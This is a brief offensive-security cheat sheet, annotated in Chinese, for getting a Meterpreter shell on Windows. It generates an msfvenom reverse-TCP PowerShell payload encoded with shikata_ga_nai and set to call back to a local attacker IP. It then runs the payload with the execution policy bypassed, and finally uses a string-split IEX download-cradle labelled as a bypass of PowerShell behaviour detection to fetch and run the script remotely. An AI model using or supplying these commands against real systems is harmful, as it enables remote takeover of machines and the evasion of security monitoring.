	>msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1
	执行
	>powershell -ep bypass -noexit -file 1.ps1
	Powershell行为检测bypass
	>powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"